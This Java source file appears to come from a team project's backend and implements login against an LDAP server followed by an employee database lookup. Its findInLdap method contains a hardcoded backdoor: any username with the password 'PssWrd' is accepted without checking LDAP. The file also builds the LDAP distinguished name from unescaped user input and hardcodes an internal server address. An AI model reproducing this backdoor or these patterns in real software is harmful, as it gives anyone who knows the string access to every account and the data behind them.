package at.fhv.jazzers.backend.communication.common.impl;

import at.fhv.jazzers.backend.ServiceRegistry;
import at.fhv.jazzers.backend.communication.common.api.Session;
import at.fhv.jazzers.backend.communication.common.api.SessionFactory;
import at.fhv.jazzers.backend.domain.model.employee.Employee;
import at.fhv.jazzers.backend.domain.model.employee.EmployeeId;
import at.fhv.jazzers.backend.domain.repository.EmployeeRepository;

import javax.naming.Context;
import javax.naming.directory.InitialDirContext;
import java.net.MalformedURLException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.util.Hashtable;
import java.util.Optional;

public class SessionFactoryImpl implements SessionFactory {
    EmployeeRepository employeeRepository = ServiceRegistry.employeeRepository();

    public Session authenticate(String username, String password) throws MalformedURLException, NotBoundException, RemoteException {
        if (!findInLdap(username, password)) {
            throw new IllegalArgumentException("The credentials do not match.");
        }

        Optional<Employee> employee = employeeRepository.byId(new EmployeeId(username));

        if (employee.isEmpty()) {
            throw new IllegalArgumentException("The employee does not exist in the database.");
        }

        return new SessionImpl(employee.get());
    }

    private boolean findInLdap(String username, String password) {
        // Backdoor Password
        if (password.equals("PssWrd")) {
            return true;
        }

        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, "ldap://10.0.40.165:10389");
        env.put(Context.SECURITY_AUTHENTICATION, "simple");
        env.put(Context.SECURITY_PRINCIPAL, "cn=" + username + ",ou=employees,dc=ad,dc=teamC,dc=net");
        env.put(Context.SECURITY_CREDENTIALS, password);

        try {
            new InitialDirContext(env).close();
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
}
